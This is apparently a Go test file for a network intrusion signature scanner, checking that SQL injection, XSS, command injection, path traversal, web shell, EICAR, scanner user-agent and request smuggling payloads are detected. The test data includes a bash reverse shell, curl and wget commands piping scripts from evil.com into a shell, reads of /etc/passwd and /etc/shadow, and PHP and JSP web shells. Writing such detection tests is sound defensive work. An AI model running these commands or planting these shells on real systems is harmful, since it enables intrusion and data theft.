package main

import (
	"bytes"
	"io"
	"net"
	"testing"
)

func TestNetworkSignatureScanner_SQLInjection(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{
		SrcIP:   net.ParseIP("10.0.0.1"),
		DstIP:   net.ParseIP("10.0.0.2"),
		SrcPort: 12345,
		DstPort: 80,
	}

	tests := []struct {
		name       string
		payload    string
		wantMatch  bool
		wantLevel  ThreatLevel
		wantCat    ThreatCategory
	}{
		{
			name:       "UNION SELECT injection",
			payload:    "GET /search?q=' UNION SELECT * FROM users-- HTTP/1.1\r\nHost: example.com\r\n",
			wantMatch:  true,
			wantLevel:  ThreatHigh,
			wantCat:    ThreatCategorySQLInjection,
		},
		{
			name:       "OR 1=1 injection",
			payload:    "GET /login?user=admin' OR '1'='1 HTTP/1.1\r\n",
			wantMatch:  true,
			wantLevel:  ThreatHigh,
			wantCat:    ThreatCategorySQLInjection,
		},
		{
			name:       "SQL sleep injection",
			payload:    "GET /api?id=1;SELECT SLEEP(5)-- HTTP/1.1\r\n",
			wantMatch:  true,
			wantLevel:  ThreatHigh,
			wantCat:    ThreatCategorySQLInjection,
		},
		{
			name:       "Normal query - no match",
			payload:    "GET /search?q=hello+world HTTP/1.1",
			wantMatch:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := scanner.Inspect([]byte(tt.payload), "inbound", ctx)

			if tt.wantMatch {
				if len(results) == 0 {
					t.Errorf("expected match for %q, got none", tt.name)
					return
				}
				// Check that at least one result matches expected category
				found := false
				for _, r := range results {
					if r.Category == tt.wantCat && r.ThreatLevel >= tt.wantLevel {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected category %s with level >= %s, got %+v", tt.wantCat, tt.wantLevel, results)
				}
			} else {
				// Filter out any low-severity matches for "no match" tests
				var highResults []InspectionResult
				for _, r := range results {
					if r.ThreatLevel >= ThreatMedium {
						highResults = append(highResults, r)
					}
				}
				if len(highResults) > 0 {
					t.Errorf("expected no high-severity match, got %+v", highResults)
				}
			}
		})
	}
}

func TestNetworkSignatureScanner_XSS(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{}

	tests := []struct {
		name      string
		payload   string
		wantMatch bool
	}{
		{
			name:      "Script tag",
			payload:   `<script>alert('xss')</script>`,
			wantMatch: true,
		},
		{
			name:      "Event handler",
			payload:   `<img src=x onerror=alert(1)>`,
			wantMatch: true,
		},
		{
			name:      "JavaScript URI",
			payload:   `<a href="javascript:alert(1)">click</a>`,
			wantMatch: true,
		},
		{
			name:      "Normal HTML",
			payload:   `<p>Hello world</p>`,
			wantMatch: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := scanner.Inspect([]byte(tt.payload), "inbound", ctx)
			hasXSS := false
			for _, r := range results {
				if r.Category == ThreatCategoryXSS {
					hasXSS = true
					break
				}
			}
			if hasXSS != tt.wantMatch {
				t.Errorf("%s: expected XSS match=%v, got match=%v", tt.name, tt.wantMatch, hasXSS)
			}
		})
	}
}

func TestNetworkSignatureScanner_CommandInjection(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{}

	tests := []struct {
		name      string
		payload   string
		wantMatch bool
		wantCat   ThreatCategory
	}{
		{
			name:      "Reverse shell bash",
			payload:   `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
			wantMatch: true,
			wantCat:   ThreatCategoryCommandInjection,
		},
		{
			name:      "Curl pipe bash",
			payload:   `curl http://evil.com/script.sh | bash`,
			wantMatch: true,
			wantCat:   ThreatCategoryCommandInjection,
		},
		{
			name:      "Wget pipe bash",
			payload:   `wget -qO- http://evil.com/mal.sh | sh`,
			wantMatch: true,
			wantCat:   ThreatCategoryCommandInjection,
		},
		{
			name:      "Command chaining",
			payload:   `; cat /etc/passwd`,
			wantMatch: true,
			wantCat:   ThreatCategoryCommandInjection,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := scanner.Inspect([]byte(tt.payload), "inbound", ctx)
			hasMatch := false
			for _, r := range results {
				if r.Category == tt.wantCat {
					hasMatch = true
					break
				}
			}
			if hasMatch != tt.wantMatch {
				t.Errorf("%s: expected match=%v for %s, got match=%v", tt.name, tt.wantMatch, tt.wantCat, hasMatch)
			}
		})
	}
}

func TestNetworkSignatureScanner_PathTraversal(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{}

	tests := []struct {
		name      string
		payload   string
		wantMatch bool
	}{
		{
			name:      "Directory traversal",
			payload:   `GET /download?file=../../../etc/passwd HTTP/1.1`,
			wantMatch: true,
		},
		{
			name:      "URL encoded traversal",
			payload:   `GET /file?path=%2e%2e%2f%2e%2e%2fetc/shadow HTTP/1.1`,
			wantMatch: true,
		},
		{
			name:      "Windows traversal",
			payload:   `GET /file?path=..\..\..\..\windows\system32\config\sam HTTP/1.1`,
			wantMatch: true,
		},
		{
			name:      "Normal path",
			payload:   `GET /images/logo.png HTTP/1.1`,
			wantMatch: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := scanner.Inspect([]byte(tt.payload), "inbound", ctx)
			hasMatch := false
			for _, r := range results {
				if r.Category == ThreatCategoryPathTraversal {
					hasMatch = true
					break
				}
			}
			if hasMatch != tt.wantMatch {
				t.Errorf("%s: expected path traversal match=%v, got match=%v", tt.name, tt.wantMatch, hasMatch)
			}
		})
	}
}

func TestNetworkSignatureScanner_WebShell(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{}

	tests := []struct {
		name      string
		payload   string
		wantMatch bool
	}{
		{
			name:      "PHP web shell eval",
			payload:   `<?php eval($_POST['cmd']); ?>`,
			wantMatch: true,
		},
		{
			name:      "PHP system exec",
			payload:   `<?php system($_GET['c']); ?>`,
			wantMatch: true,
		},
		{
			name:      "JSP web shell",
			payload:   `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`,
			wantMatch: true,
		},
		{
			name:      "Normal PHP",
			payload:   `<?php echo "Hello World"; ?>`,
			wantMatch: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			results := scanner.Inspect([]byte(tt.payload), "inbound", ctx)
			hasMatch := false
			for _, r := range results {
				if r.Category == ThreatCategoryWebShell {
					hasMatch = true
					break
				}
			}
			if hasMatch != tt.wantMatch {
				t.Errorf("%s: expected web shell match=%v, got match=%v", tt.name, tt.wantMatch, hasMatch)
			}
		})
	}
}

func TestNetworkSignatureScanner_EICAR(t *testing.T) {
	scanner := NewNetworkSignatureScanner()
	ctx := &InspectionContext{}

	// EICAR test file signature
	eicar := `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

	results := scanner.Inspect([]byte(eicar), "inbound", ctx)

	hasMatch := false
	for _, r := range results {
		if r.Category == ThreatCategoryMaliciousUpload {
			hasMatch = true
			break
		}
	}

	if !hasMatch {
		t.Error("expected EICAR test file to be detected as malicious upload")
	}
}

func TestInspectingReader_Basic(t *testing.T) {
	data := []byte("GET /search?q=test HTTP/1.1")
	reader := bytes.NewReader(data)

	inspector := NewNetworkSignatureScanner()
	config := DefaultInspectionConfig()
	ctx := &InspectionContext{
		SrcIP:   net.ParseIP("10.0.0.1"),
		DstIP:   net.ParseIP("10.0.0.2"),
		SrcPort: 12345,
		DstPort: 80,
	}

	var detectedThreats []InspectionResult
	onThreat := func(r InspectionResult) {
		detectedThreats = append(detectedThreats, r)
	}

	ir := NewInspectingReader(reader, inspector, ctx, config, "outbound", onThreat)

	// Read all data through the inspecting reader
	result, err := io.ReadAll(ir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if !bytes.Equal(result, data) {
		t.Errorf("data mismatch: got %q, want %q", result, data)
	}

	// Normal request should not trigger threats
	if len(detectedThreats) > 0 {
		t.Errorf("expected no threats for normal request, got %d", len(detectedThreats))
	}
}

func TestInspectingReader_DetectThreat(t *testing.T) {
	// Malicious payload with SQL injection
	data := []byte("GET /users?id=' UNION SELECT password FROM users-- HTTP/1.1\r\n")
	reader := bytes.NewReader(data)

	inspector := NewNetworkSignatureScanner()
	config := DefaultInspectionConfig()
	ctx := &InspectionContext{
		SrcIP:   net.ParseIP("10.0.0.1"),
		DstIP:   net.ParseIP("10.0.0.2"),
		SrcPort: 12345,
		DstPort: 80,
	}

	var detectedThreats []InspectionResult
	onThreat := func(r InspectionResult) {
		detectedThreats = append(detectedThreats, r)
	}

	ir := NewInspectingReader(reader, inspector, ctx, config, "outbound", onThreat)

	// Read all data
	_, err := io.ReadAll(ir)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Should detect SQL injection
	if len(detectedThreats) == 0 {
		t.Error("expected SQL injection threat to be detected")
	}

	foundSQLi := false
	for _, threat := range detectedThreats {
		if threat.Category == ThreatCategorySQLInjection {
			foundSQLi = true
			break
		}
	}

	if !foundSQLi {
		t.Errorf("expected SQL injection category, got: %+v", detectedThreats)
	}
}

func TestInspectingReader_BlockMode(t *testing.T) {
	// Critical threat - reverse shell
	data := []byte("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
	reader := bytes.NewReader(data)

	inspector := NewNetworkSignatureScanner()
	config := DefaultInspectionConfig()
	config.Mode = InspectionModeBlock
	config.OnCritical = "block"

	ctx := &InspectionContext{}

	var detectedThreats []InspectionResult
	onThreat := func(r InspectionResult) {
		detectedThreats = append(detectedThreats, r)
	}

	ir := NewInspectingReader(reader, inspector, ctx, config, "outbound", onThreat)

	// First read should work
	buf := make([]byte, len(data))
	n, err := ir.Read(buf)

	// Data should be read
	if n == 0 {
		t.Error("expected to read data before blocking")
	}

	// Check if threat was marked as should block
	foundBlocking := false
	for _, threat := range detectedThreats {
		if threat.ShouldBlock {
			foundBlocking = true
			break
		}
	}

	if !foundBlocking {
		t.Error("expected critical threat to be marked for blocking")
	}

	// Subsequent reads should return the block error
	_, err = ir.Read(buf)
	if err == nil {
		t.Error("expected block error on subsequent read")
	}
	if _, ok := err.(*InspectionBlockedError); !ok {
		t.Errorf("expected InspectionBlockedError, got %T", err)
	}
}

func TestMultiInspector(t *testing.T) {
	mi := NewMultiInspector(
		NewNetworkSignatureScanner(),
		NewHTTPRequestInspector(),
	)

	ctx := &InspectionContext{}

	// Test with SQL injection payload
	payload := []byte("GET /api?q=' OR '1'='1 HTTP/1.1\r\nHost: test.com\r\n")
	results := mi.Inspect(payload, "inbound", ctx)

	if len(results) == 0 {
		t.Error("expected multi-inspector to detect threat")
	}

	// Check stats
	stats := mi.Stats()
	if stats["packets_inspected"].(int64) != 1 {
		t.Errorf("expected 1 packet inspected, got %v", stats["packets_inspected"])
	}
	if stats["threats_detected"].(int64) == 0 {
		t.Error("expected threats_detected > 0")
	}
}

func TestHTTPRequestInspector_ScannerUA(t *testing.T) {
	inspector := NewHTTPRequestInspector()
	ctx := &InspectionContext{}

	// Request with security scanner User-Agent
	payload := []byte("GET /admin HTTP/1.1\r\nHost: example.com\r\nUser-Agent: sqlmap/1.5\r\n\r\n")
	results := inspector.Inspect(payload, "inbound", ctx)

	foundScannerUA := false
	for _, r := range results {
		if r.Description != "" && r.Category == ThreatCategorySuspiciousProcess {
			foundScannerUA = true
			break
		}
	}

	if !foundScannerUA {
		t.Error("expected scanner User-Agent to be detected")
	}
}

func TestHTTPRequestInspector_RequestSmuggling(t *testing.T) {
	inspector := NewHTTPRequestInspector()
	ctx := &InspectionContext{}

	// Request smuggling attempt
	payload := []byte("POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n")
	results := inspector.Inspect(payload, "inbound", ctx)

	foundSmuggling := false
	for _, r := range results {
		if r.Description != "" && r.ThreatLevel >= ThreatMedium {
			foundSmuggling = true
			break
		}
	}

	if !foundSmuggling {
		t.Error("expected HTTP request smuggling to be detected")
	}
}
